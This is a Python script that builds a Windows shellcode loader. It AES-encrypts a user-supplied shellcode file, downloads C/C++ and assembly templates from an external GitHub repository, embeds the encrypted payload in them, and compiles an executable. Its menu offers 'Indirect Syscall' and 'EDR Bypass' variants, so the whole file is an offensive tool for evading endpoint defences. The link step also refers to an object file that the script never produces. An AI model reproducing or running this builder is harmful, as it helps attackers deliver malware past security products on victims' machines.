
import requests
import subprocess
import os
from os import urandom

# Assumed AES functions
def AESencrypt(content, key):
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
    cipher = AES.new(key, AES.MODE_ECB)
    encrypted = cipher.encrypt(pad(content, AES.block_size))
    return encrypted, key

def indirect():
    with open(payload_name, "rb") as file:
        content = file.read()
    KEY = urandom(16)
    ciphertext, key = AESencrypt(content, KEY)

    ciphertext_str = ', '.join(f'0x{byte:02x}' for byte in ciphertext)
    key_str = ', '.join(f'0x{byte:02x}' for byte in KEY)
    aeskey = f"unsigned char AESkey[] = {{ {key_str} }};"
    aescode = f"unsigned char cool[] = {{ {ciphertext_str} }};"

    url = "https://raw.githubusercontent.com/dagowda/dhanush_intro/refs/heads/main/dummyda/indirect/indirect.c"
    url2 = "https://raw.githubusercontent.com/dagowda/dhanush_intro/refs/heads/main/dummyda/indirect/syscalls.asm"
    url3 = "https://raw.githubusercontent.com/dagowda/dhanush_intro/refs/heads/main/dummyda/indirect/syscalls.h"

    try:
        res = requests.get(url)
        content1 = res.text
        content1 = content1.replace('unsigned char AESkey[] = {};', aeskey)
        content1 = content1.replace('unsigned char cool[] = {};', aescode)
        with open("indirect.c", "wb") as f:
            f.write(content1.encode('utf-8'))
    except requests.RequestException as e:
        print(f"Error: {e}")
        exit(1)

    try:
        res = requests.get(url2)
        with open("syscalls.asm", "wb") as f:
            f.write(res.content)
    except requests.RequestException as e:
        print(f"Error: {e}")
        exit(1)

    try:
        res = requests.get(url3)
        with open("syscalls.h", "wb") as f:
            f.write(res.content)
    except requests.RequestException as e:
        print(f"Error: {e}")
        exit(1)

    try:
        subprocess.run(["uasm", "-win64", "syscalls.asm", "-Fo=syscalls.obj"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        subprocess.run(["x86_64-w64-mingw32-gcc", "-c", "indirect.c", "-o", "sai.obj"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        subprocess.run(["x86_64-w64-mingw32-gcc", "sai.obj", "syscalls.o", "-o", "sai_indirect.exe"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print("[*] Payload successfully created as sai_indirect.exe")
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")

    files = ["syscalls.asm", "indirect.c", "syscalls.h", "syscalls.o", "sai.obj"]
    for file in files:
        os.remove(file)

def indirect2():
    with open(payload_name, "rb") as file:
        content = file.read()
    KEY = urandom(16)
    ciphertext, key = AESencrypt(content, KEY)

    ciphertext_str = ', '.join(f'0x{byte:02x}' for byte in ciphertext)
    key_str = ', '.join(f'0x{byte:02x}' for byte in KEY)
    aeskey = f"unsigned char AESkey[] = {{ {key_str} }};"
    aescode = f"unsigned char cool[] = {{ {ciphertext_str} }};"

    url = "https://raw.githubusercontent.com/dagowda/dhanush_intro/refs/heads/main/dummyda/indirect/indi_ker_ntdll.cpp"
    url2 = "https://raw.githubusercontent.com/dagowda/dhanush_intro/refs/heads/main/dummyda/indirect/syscalls.asm"
    url3 = "https://raw.githubusercontent.com/dagowda/dhanush_intro/refs/heads/main/dummyda/indirect/syscalls.h"

    try:
        res = requests.get(url)
        content1 = res.text
        content1 = content1.replace('unsigned char AESkey[] = {};', aeskey)
        content1 = content1.replace('unsigned char cool[] = {};', aescode)
        with open("indirect.c", "wb") as f:
            f.write(content1.encode('utf-8'))
    except requests.RequestException as e:
        print(f"Error: {e}")
        exit(1)

    try:
        res = requests.get(url2)
        with open("syscalls.asm", "wb") as f:
            f.write(res.content)
    except requests.RequestException as e:
        print(f"Error: {e}")
        exit(1)

    try:
        res = requests.get(url3)
        with open("syscalls.h", "wb") as f:
            f.write(res.content)
    except requests.RequestException as e:
        print(f"Error: {e}")
        exit(1)

    try:
        subprocess.run(["uasm", "-win64", "syscalls.asm", "-Fo=syscalls.obj"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        subprocess.run(["x86_64-w64-mingw32-gcc", "-c", "indirect.c", "-o", "sai.obj"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        subprocess.run(["x86_64-w64-mingw32-gcc", "sai.obj", "syscalls.o", "-o", "sai_indirect_2.exe"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print("[*] Payload successfully created as sai_indirect_2.exe")
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")

    files = ["syscalls.asm", "indirect.c", "syscalls.h", "syscalls.o", "sai.obj"]
    for file in files:
        os.remove(file)

if __name__ == "__main__":
    payload_name = input("Please type in the shellcode file name: ")
    print("Payload Choices:\n11.) Indirect Syscall\n13.) EDR Bypass (indirect2)")
    havoc = input("Enter your payload choice (11 or 13): ")
    if havoc.strip() == "11":
        print("Selected Indirect Syscall Payload")
        indirect()
    elif havoc.strip() == "13":
        print("Selected EDR Bypass Payload")
        indirect2()
    else:
        print("Invalid choice.")
        exit(1)
